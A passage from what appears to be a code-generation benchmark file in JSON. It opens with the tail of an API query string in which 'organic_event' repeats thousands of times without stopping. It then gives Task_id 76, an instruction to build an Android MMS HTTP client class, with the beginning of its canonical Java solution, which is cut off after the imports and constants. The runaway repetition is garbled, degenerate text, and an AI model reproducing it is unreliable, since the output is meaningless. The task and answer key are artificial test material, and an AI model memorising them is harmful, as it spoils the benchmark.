\"?expansions=attachments.media_keys,attachments.poll_ids,author_id,geo.place_id,entities.mentions.username,entities.poll_ids,entities.hashtags.tag,entities.cashtags.hashtag&tweet.fields=created_at,public_metrics,edit_controls,conversation_id,possibly_sensitive,source,lang,withheld,verified,edit_mode,edit_controls,spoiler_alert,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic_event,organic"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for MMS (Multimedia Messaging Service) operations, supporting both HTTP and HTTPS protocols with configurable proxy settings and connection parameters.\n\nClass Description: MmsHttpClient is a specialized HTTP client designed for MMS operations that handles both GET and POST requests. It manages network connections, proxy configurations, request/response handling, and includes MMS-specific header management. The class uses OkHttp internally for connection management.\n\nAttributes:\n- mContext: Context - Android application context\n- mSocketFactory: SocketFactory - Factory for creating sockets\n- mHostResolver: MmsNetworkManager - Network host resolver for connection management\n- mConnectionPool: ConnectionPool - Pool of HTTP connections for reuse\n\nMethods:\n- execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) -> byte[] - Executes an HTTP request to the specified URL with given PDU data. Handles both GET and POST methods with proxy support. Returns the response body as byte array.\n- openConnection(URL url, Proxy proxy) -> HttpURLConnection - Creates and configures an appropriate HttpURLConnection (HTTP or HTTPS) with the given URL and proxy settings. Throws MalformedURLException for invalid protocols.\n- checkMethod(String method) -> void - Validates that the HTTP method is either GET or POST (helper method)\n- getCurrentAcceptLanguage(Locale locale) -> String - Generates Accept-Language header value from locale (helper method)\n- addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) -> void - Adds additional MMS-specific headers to the request (helper method)\n- logHttpHeaders(Map<String, List<String>> headers) -> void - Logs HTTP headers for debugging (helper method)",
    "Canonical_solution": "import android.content.Context;\nimport com.android.mms.service_alt.exception.MmsHttpException;\nimport com.squareup.okhttp.ConnectionPool;\nimport com.squareup.okhttp.ConnectionSpec;\nimport com.squareup.okhttp.OkHttpClient;\nimport com.squareup.okhttp.Protocol;\nimport com.squareup.okhttp.Request;\nimport com.squareup.okhttp.Response;\nimport com.squareup.okhttp.internal.Internal;\nimport com.squareup.okhttp.internal.huc.HttpURLConnectionImpl;\nimport com.squareup.okhttp.internal.huc.HttpsURLConnectionImpl;\nimport timber.log.Timber;\n\nimport javax.net.SocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.Proxy;\nimport java.net.ProxySelector;\nimport java.net.SocketAddress;\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class MmsHttpClient {\n\n    public static final String METHOD_POST = \"POST\";\n    public static final String METHOD_GET = \"GET\";\n\n    